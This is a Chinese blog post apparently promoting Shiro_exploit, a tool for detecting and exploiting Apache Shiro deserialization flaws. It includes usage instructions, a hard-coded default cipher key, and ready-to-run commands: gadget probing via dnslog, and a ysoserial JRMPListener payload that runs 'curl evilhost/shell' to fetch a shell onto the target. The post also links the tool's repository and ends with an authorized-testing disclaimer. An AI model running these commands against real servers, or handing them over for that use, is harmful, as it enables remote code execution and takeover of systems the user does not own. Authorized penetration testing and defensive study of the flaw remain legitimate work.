#  【工具篇】Apache Shiro 反序列化漏洞检测与利用工具   
insightglacier  扫地僧的茶饭日常   2024-11-02 10:00  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/6VPfsHeIgHLXhdpFEFwcnAVZhMxOcOX66B1Kwjqy1nYJO89qEPK8ffVKuJglr08vspHMZIDiccYznojvbqsVytA/640?wx_fmt=gif "")  
  
喜欢就关注我吧，订阅更多最新消息  
  
  
**工具介绍**  
  
  
  
Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。  
  
该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。  
  
  
**环境**  
  
  
  
Python2.7  
  
requests  
  
Jdk 1.8  
  
  
**使用说明**  
  
  
```
usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]

OPTIONS:
-h, --help            show this help message and exit
-u URL, --url URL     Target url.
-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3
-g GADGET, --gadget GADGET
                        gadget
-p PARAMS, --params PARAMS
                        gadget params
-k KEY, --key KEY     CipherKey

Example: python shiro_exploit.py -u target
```  
  
检测默认只需要使用-u参数即可。  
  
检测可用gadget的方式可以运行  
```
python shiro_exploit.py -u http://target/ -t 3 -p "ping -c 2 {dnshost}" -k "kPH+bIxk5D2deZiIxcaaaA=="
```  
  
程序执行时会获取dnslog的域名替换 {dnshost} 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/6VPfsHeIgHIyG3Fq84rvz1rpupwIEHxicEdicktaUmWqDCRIFXajJvtIMVXUTjgARDAPCY2hD7QqLicFwDD9TclYA/640?wx_fmt=png&from=appmsg "")  
  
利用的话，可以采用JRMP的方式。也可以根据检测出来的gadge来进行利用。  
  
服务器：  
```
java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'curl evilhost/shell –o shell'
```  
  
本地：  
```
python shiro_exploit.py -u http://target/ -t 2 -g JRMPClient -p "remote_host:1099" -k "kPH+bIxk5D2deZiIxcaaaA=="
```  
  
  
**下载地址**  
  
  
  
https://github.com/insightglacier/Shiro_exploit  
  
  
**注：****本文中提到的漏洞验证 poc 或工具仅用于授权测试，任何未经授权的测试均属于非法行为。任何人不得利用本文中的技术手段或工具进行非法攻击和侵犯他人的隐私和财产权利。一旦发生任何违法行为，责任自负。**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/6VPfsHeIgHLXhdpFEFwcnAVZhMxOcOX66B1Kwjqy1nYJO89qEPK8ffVKuJglr08vspHMZIDiccYznojvbqsVytA/640?wx_fmt=gif "")  
  
喜欢就关注我吧，订阅更多最新消息  
  
  
  
